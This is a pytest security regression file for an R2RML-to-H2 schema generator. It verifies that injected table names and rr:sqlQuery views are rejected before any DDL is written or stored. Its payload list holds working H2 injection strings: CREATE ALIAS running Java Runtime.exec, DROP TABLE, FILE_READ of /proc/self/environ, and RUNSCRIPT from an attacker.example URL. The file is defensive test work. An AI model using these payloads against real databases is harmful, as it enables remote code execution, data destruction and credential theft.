# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""An ``rr:tableName`` literal must never reach generated SQL verbatim.

``_tables_to_h2_ddl`` interpolates logical table names into the ``schema.sql``
the VKG container feeds to H2's RunScript at startup, and H2's ``CREATE ALIAS``
compiles and runs Java. So a mapping literal that the SQL parser reads as more
than one identifier is remote code execution in that container, not a cosmetic
DDL defect. The names come from an editable R2RML artifact, which makes them
attacker-controlled input to that sink.

Both sinks in the generator are covered here: the per-catalog-table statement
(where ``_align_to_mapping`` may prefer the mapping's literal over the
catalog-derived name) and the coverage guard that emits a ``CREATE TABLE`` for a
mapping literal the catalog never produced.

The fix rejects rather than escapes: re-quoting ``orders`` into ``"orders"``
would rename the table (SQL folds only unquoted names to upper case), the
mapping would then name a table the DDL does not declare, and Ontop fails the
WHOLE namespace. So a well-formed name must come out byte-identical.
"""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.unit

_DS = "11111111-1111-1111-1111-111111111111"

# Each payload closes the generated statement and starts another. The first is
# the full chain from the finding: CREATE ALIAS compiles Java, which is OS
# command execution as the H2 admin the entrypoint used to run scripts as.
_PAYLOADS = [
    "x; CREATE ALIAS EXEC_CMD AS $$ String c() throws Exception "
    '{ return new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).next(); } $$; --.orders',
    "customers (id INTEGER); DROP TABLE customers; --",
    "orders; CALL FILE_READ('/proc/self/environ', NULL); --",
    "orders\"; RUNSCRIPT FROM 'http://attacker.example/evil.sql'; --",
    "orders\nCREATE ALIAS a AS $$ x $$;",
    "orders -- comment out the rest of the file",
]


def _catalog_table(name: str, *, schema: str = "db") -> object:
    from coa_ontology.inducer.services.data_catalog import CatalogTable

    return CatalogTable(
        id=f"{_DS}:{name}",
        name=name,
        fullyQualifiedName=f"{schema}.{name}",
        datasourceId=_DS,
        sourceSchema=schema,
        columns=[{"name": "id", "dataType": "INT"}],
    )


def _mapping(*literals: str) -> str:
    """R2RML naming ``literals`` as logical tables, as an edited artifact would."""
    body = "".join(f'<#tm{i}> rr:logicalTable [ rr:tableName """{lit}""" ] .\n' for i, lit in enumerate(literals))
    return "@prefix rr: <http://www.w3.org/ns/r2rml#> .\n" + body


def _table_names(ttl: str) -> list[str]:
    from coa_ontology.proposals import _mapping_table_names

    return _mapping_table_names(ttl) or []


@pytest.mark.parametrize("payload", _PAYLOADS)
def test_payload_in_the_per_table_sink_is_rejected(payload: str) -> None:
    """A literal matching a catalog table by bare name reaches the first sink."""
    from coa_ontology.proposals import SchemaSqlGenerationError, _tables_to_h2_ddl

    # _align_to_mapping prefers the mapping literal for this table, so the
    # payload is what would be interpolated into its CREATE TABLE.
    with pytest.raises(SchemaSqlGenerationError, match="not valid SQL identifier paths"):
        _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping(payload)))


@pytest.mark.parametrize("payload", _PAYLOADS)
def test_payload_in_the_coverage_guard_sink_is_rejected(payload: str) -> None:
    """A literal with no catalog table of its own reaches the second sink."""
    from coa_ontology.proposals import SchemaSqlGenerationError, _tables_to_h2_ddl

    with pytest.raises(SchemaSqlGenerationError, match="not valid SQL identifier paths"):
        _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping('"orders"', payload)))


def test_the_rejection_names_the_offending_literal() -> None:
    """An operator has to be able to find the mapping line to fix."""
    from coa_ontology.proposals import SchemaSqlGenerationError, _tables_to_h2_ddl

    with pytest.raises(SchemaSqlGenerationError) as exc:
        _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping("bad; DROP TABLE t; --")))

    assert "bad; DROP TABLE t; --" in str(exc.value)


def test_no_sql_is_emitted_before_the_rejection() -> None:
    """The gate runs before any DDL text exists, so there is no partial file."""
    from coa_ontology.proposals import SchemaSqlGenerationError, _tables_to_h2_ddl

    with pytest.raises(SchemaSqlGenerationError) as exc:
        _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping("x; CREATE ALIAS a AS $$ y $$; --")))

    assert "CREATE ALIAS" not in str(exc.value).replace("x; CREATE ALIAS a AS $$ y $$; --", "")


class TestWellFormedNamesAreUnchanged:
    """The other half of the contract: no accepted namespace changes shape."""

    def test_bare_table_name_stays_bare(self) -> None:
        from coa_ontology.proposals import _tables_to_h2_ddl

        ddl = _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping('"orders"')))

        assert 'CREATE TABLE IF NOT EXISTS "orders" ("id" INTEGER);' in ddl
        assert "CREATE SCHEMA" not in ddl

    def test_qualified_names_declare_their_schemas(self) -> None:
        from coa_ontology.proposals import _tables_to_h2_ddl

        tables = [_catalog_table("customers", schema="public"), _catalog_table("customers", schema="sales")]
        # Distinct ids: same bare name in two schemas is what forces qualification.
        tables[1].id = f"{_DS}-b:customers"  # type: ignore[attr-defined]
        tables[1].datasourceId = f"{_DS}-b"  # type: ignore[attr-defined]

        ddl = _tables_to_h2_ddl(tables, _table_names(_mapping('"public"."customers"', '"sales"."customers"')))

        assert 'CREATE SCHEMA IF NOT EXISTS "public";' in ddl
        assert 'CREATE SCHEMA IF NOT EXISTS "sales";' in ddl
        assert 'CREATE TABLE IF NOT EXISTS "public"."customers" ("id" INTEGER);' in ddl
        assert 'CREATE TABLE IF NOT EXISTS "sales"."customers" ("id" INTEGER);' in ddl

    def test_coverage_guard_still_covers_an_undeclared_literal(self) -> None:
        from coa_ontology.proposals import _tables_to_h2_ddl

        ddl = _tables_to_h2_ddl([_catalog_table("orders")], _table_names(_mapping('"orders"', '"legacy"."orders"')))

        assert 'CREATE SCHEMA IF NOT EXISTS "legacy";' in ddl
        assert 'CREATE TABLE IF NOT EXISTS "legacy"."orders" ("id" INTEGER);' in ddl

    def test_a_dot_inside_one_identifier_is_not_a_qualifier(self) -> None:
        """``"q1.results"`` is one table, not schema ``q1`` plus table ``results``."""
        from coa_ontology.proposals import _tables_to_h2_ddl

        ddl = _tables_to_h2_ddl([_catalog_table("q1.results")], _table_names(_mapping('"q1.results"')))

        assert 'CREATE TABLE IF NOT EXISTS "q1.results" ("id" INTEGER);' in ddl
        assert "CREATE SCHEMA" not in ddl


class TestUpdateProposalRejectsAtTheEdit:
    """Screen at write time too, so a bad literal is never stored.

    Without this, the mapping parses as Turtle, saves cleanly, and only blows up
    later inside ``accept`` — where the operator sees a schema-generation failure
    on a proposal they cannot edit any more.
    """

    _PAYLOAD = 'bad; CREATE ALIAS EXEC_CMD AS $$ String c() { return "x"; } $$; --'

    @staticmethod
    def _request(**kwargs: object) -> object:
        from coa_ontology.proposals import UpdateProposalRequest

        return UpdateProposalRequest(proposal_id="p-1", **kwargs)  # type: ignore[arg-type]

    @pytest.fixture(autouse=True)
    def _pending_proposal(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store

        monkeypatch.setattr(dynamo_store, "get_proposal_by_id", lambda *a, **k: {"status": "pending"})

    def test_inline_r2rml_with_a_payload_is_a_422(self) -> None:
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc:
            update_proposal(self._request(r2rml_turtle=_mapping(self._PAYLOAD)))  # type: ignore[arg-type]

        assert exc.value.status_code == 422
        assert "rr:tableName must be a SQL identifier path" in str(exc.value.detail)
        assert self._PAYLOAD in str(exc.value.detail)

    def test_uploaded_r2rml_with_a_payload_is_a_422(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The presigned-upload path bypasses the request body, not the check."""
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        monkeypatch.setattr(dynamo_store, "_get_artifact_s3", lambda *a, **k: _mapping(self._PAYLOAD))

        request = self._request(r2rml_uploaded=True, upload_revision_id="3f3b0f8a-0000-4000-8000-000000000000")
        with pytest.raises(HTTPException) as exc:
            update_proposal(request)  # type: ignore[arg-type]

        assert exc.value.status_code == 422
        assert "rr:tableName must be a SQL identifier path" in str(exc.value.detail)

    def test_nothing_is_written_when_the_literal_is_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        def _fail(*args: object, **kwargs: object) -> None:
            raise AssertionError("a rejected R2RML artifact must not be persisted")

        monkeypatch.setattr(dynamo_store, "_put_artifact_s3", _fail)
        monkeypatch.setattr(dynamo_store, "update_proposal", _fail)

        with pytest.raises(HTTPException):
            update_proposal(self._request(r2rml_turtle=_mapping(self._PAYLOAD)))  # type: ignore[arg-type]

    def test_well_formed_r2rml_still_saves(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal

        monkeypatch.setattr(dynamo_store, "_put_artifact_s3", lambda *a, **k: "ns/p-1/r2rml.ttl")
        monkeypatch.setattr(dynamo_store, "update_proposal", lambda *a, **k: None)

        result = update_proposal(self._request(r2rml_turtle=_mapping('"public"."customers"', "orders")))  # type: ignore[arg-type]

        assert result == {"proposal_id": "p-1", "status": "updated"}


class TestUnemittableTableNames:
    """The screening predicate the route and the generator share."""

    def test_reports_only_the_bad_literals_sorted(self) -> None:
        from coa_ontology.proposals import unemittable_table_names

        assert unemittable_table_names(['"orders"', "b; --", "a; --", "db.orders"]) == ["a; --", "b; --"]

    def test_accepts_every_well_formed_shape(self) -> None:
        from coa_ontology.proposals import unemittable_table_names

        well_formed = ['"orders"', '"public"."customers"', "orders", "db.orders", '"q1.results"']

        assert unemittable_table_names(well_formed) == []


def _sqlquery_mapping(query: str) -> str:
    """R2RML whose logical table is an ``rr:sqlQuery`` view (no ``rr:tableName``)."""
    return '@prefix rr: <http://www.w3.org/ns/r2rml#> .\n<#tm> rr:logicalTable [ rr:sqlQuery """' + query + '""" ] .\n'


class TestSqlQueryViewIsRejected:
    """An ``rr:sqlQuery`` logical table carries raw SQL Ontop runs against H2 as
    the admin (``sa``) user — ``FILE_READ``/``CSVWRITE``/``RUNSCRIPT``/``CREATE
    ALIAS`` are all reachable. Induction never emits one, so the ingestion
    boundary refuses it outright.
    """

    # Admin-only H2 call. The tableName gate never looks at rr:sqlQuery, so this
    # mapping passes it entirely — the hole the sqlQuery gate closes.
    _ADMIN_QUERY = "SELECT FILE_READ('/etc/hostname') AS leaked"

    def test_predicate_flags_a_sqlquery_view(self) -> None:
        from coa_ontology.proposals import _r2rml_declares_sql_view

        assert _r2rml_declares_sql_view(_sqlquery_mapping(self._ADMIN_QUERY)) is True

    def test_predicate_ignores_a_plain_tablename_mapping(self) -> None:
        from coa_ontology.proposals import _r2rml_declares_sql_view

        assert _r2rml_declares_sql_view(_mapping("orders", '"public"."customers"')) is False

    def test_predicate_refuses_unparseable_r2rml(self) -> None:
        from coa_ontology.proposals import _r2rml_declares_sql_view

        # Cannot read the SQL -> cannot clear it.
        assert _r2rml_declares_sql_view("this is not turtle @@@") is True

    def test_predicate_is_false_for_empty_mapping(self) -> None:
        from coa_ontology.proposals import _r2rml_declares_sql_view

        assert _r2rml_declares_sql_view(None) is False
        assert _r2rml_declares_sql_view("") is False


class TestUpdateProposalRejectsSqlQueryViews:
    """The write boundary (edit + presigned upload) refuses an rr:sqlQuery view
    with a 422, and stores nothing. Mirrors ``TestUpdateProposalRejectsAtTheEdit``.
    """

    _ADMIN_QUERY = "SELECT FILE_READ('/etc/hostname') AS leaked"

    @staticmethod
    def _request(**kwargs: object) -> object:
        from coa_ontology.proposals import UpdateProposalRequest

        return UpdateProposalRequest(proposal_id="p-1", **kwargs)  # type: ignore[arg-type]

    @pytest.fixture(autouse=True)
    def _pending_proposal(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store

        monkeypatch.setattr(dynamo_store, "get_proposal_by_id", lambda *a, **k: {"status": "pending"})

    def test_inline_sqlquery_view_is_a_422(self) -> None:
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc:
            update_proposal(self._request(r2rml_turtle=_sqlquery_mapping(self._ADMIN_QUERY)))  # type: ignore[arg-type]

        assert exc.value.status_code == 422
        assert "rr:sqlQuery" in str(exc.value.detail)

    def test_uploaded_sqlquery_view_is_a_422(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        monkeypatch.setattr(dynamo_store, "_get_artifact_s3", lambda *a, **k: _sqlquery_mapping(self._ADMIN_QUERY))

        request = self._request(r2rml_uploaded=True, upload_revision_id="3f3b0f8a-0000-4000-8000-000000000000")
        with pytest.raises(HTTPException) as exc:
            update_proposal(request)  # type: ignore[arg-type]

        assert exc.value.status_code == 422
        assert "rr:sqlQuery" in str(exc.value.detail)

    def test_nothing_is_written_when_the_view_is_rejected(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal
        from fastapi import HTTPException

        def _fail(*args: object, **kwargs: object) -> None:
            raise AssertionError("a rejected R2RML view must not be persisted")

        monkeypatch.setattr(dynamo_store, "_put_artifact_s3", _fail)
        monkeypatch.setattr(dynamo_store, "update_proposal", _fail)

        with pytest.raises(HTTPException):
            update_proposal(self._request(r2rml_turtle=_sqlquery_mapping(self._ADMIN_QUERY)))  # type: ignore[arg-type]

    def test_plain_tablename_mapping_still_saves(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """The sqlQuery gate must not reject a legitimate rr:tableName mapping."""
        from coa_ontology import dynamo_store
        from coa_ontology.proposals import update_proposal

        monkeypatch.setattr(dynamo_store, "_put_artifact_s3", lambda *a, **k: "ns/p-1/r2rml.ttl")
        monkeypatch.setattr(dynamo_store, "update_proposal", lambda *a, **k: None)

        result = update_proposal(self._request(r2rml_turtle=_mapping('"public"."customers"', "orders")))  # type: ignore[arg-type]

        assert result == {"proposal_id": "p-1", "status": "updated"}


class TestStoredSqlQueryViewNeverPublishes:
    """A proposal stored before the edit boundary refused views can still hold an
    ``rr:sqlQuery``. Accepting it must be refused, and an already-accepted one must
    never reach ``latest/mappings.r2rml`` (the mapping the VKG container loads).
    """

    _ADMIN_QUERY = "SELECT FILE_READ('/etc/hostname') AS leaked"

    @pytest.fixture
    def s3_writes(self, monkeypatch: pytest.MonkeyPatch) -> dict[str, bytes]:
        import boto3
        from coa_ontology.stores import neptune_db_graph

        writes: dict[str, bytes] = {}

        class _S3:
            def put_object(self, *, Key: str, Body: bytes, **_: object) -> None:  # noqa: N803 - boto3 kwarg names
                writes[Key] = Body

        monkeypatch.setattr(boto3, "client", lambda *a, **k: _S3())
        monkeypatch.setattr(
            neptune_db_graph,
            "_gsp_get_turtle",
            lambda _uri: "@prefix owl: <http://www.w3.org/2002/07/owl#> .\n<http://ex.org/C> a owl:Class .",
        )
        return writes

    def _accepted(self, monkeypatch: pytest.MonkeyPatch, *mappings: str) -> None:
        from coa_ontology import dynamo_store

        rows = [{"proposal_id": f"p-{i}", "r2rml_turtle": m} for i, m in enumerate(mappings)]
        monkeypatch.setattr(dynamo_store, "list_proposals", lambda *a, **k: rows)

    def test_persist_drops_a_stored_view_but_keeps_the_rest(
        self, monkeypatch: pytest.MonkeyPatch, s3_writes: dict[str, bytes]
    ) -> None:
        from coa_ontology.proposals import _persist_induced_to_s3

        self._accepted(monkeypatch, _mapping('"public"."customers"'), _sqlquery_mapping(self._ADMIN_QUERY))

        _persist_induced_to_s3("http://ex.org/o#", "ns", "https://graph/uri")

        latest = s3_writes["ontologies/ns/latest/mappings.r2rml"].decode()
        assert "customers" in latest
        assert all(b"sqlQuery" not in body and b"FILE_READ" not in body for body in s3_writes.values())

    def test_persist_writes_no_mapping_when_the_only_one_is_a_view(
        self, monkeypatch: pytest.MonkeyPatch, s3_writes: dict[str, bytes]
    ) -> None:
        from coa_ontology.proposals import _persist_induced_to_s3

        self._accepted(monkeypatch, _sqlquery_mapping(self._ADMIN_QUERY))

        _persist_induced_to_s3("http://ex.org/o#", "ns", "https://graph/uri")

        assert "ontologies/ns/latest/mappings.r2rml" not in s3_writes
        assert "ontologies/ns/latest/ontology.ttl" in s3_writes

    def test_accept_of_a_stored_view_is_a_422_and_starts_nothing(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from coa_ontology import dynamo_store, proposals
        from fastapi import HTTPException

        def _fail(*args: object, **kwargs: object) -> None:
            raise AssertionError("a refused accept must not change the proposal or start the worker")

        monkeypatch.setattr(
            dynamo_store,
            "get_proposal_by_id",
            lambda *a, **k: {
                "status": "pending",
                "job_id": "j-1",
                "ontology_id": "http://ex.org/o#",
                "ontology_turtle": "<http://ex.org/C> a <http://www.w3.org/2002/07/owl#Class> .",
                "r2rml_turtle": _sqlquery_mapping(self._ADMIN_QUERY),
            },
        )
        monkeypatch.setattr(dynamo_store, "get_reviewed_proposal", lambda *a, **k: None)
        monkeypatch.setattr(dynamo_store, "update_proposal", _fail)
        monkeypatch.setattr(proposals, "Thread", _fail)

        with pytest.raises(HTTPException) as exc:
            proposals.accept_proposal("p-1", namespace="ns")

        assert exc.value.status_code == 422
        assert "rr:sqlQuery" in str(exc.value.detail)
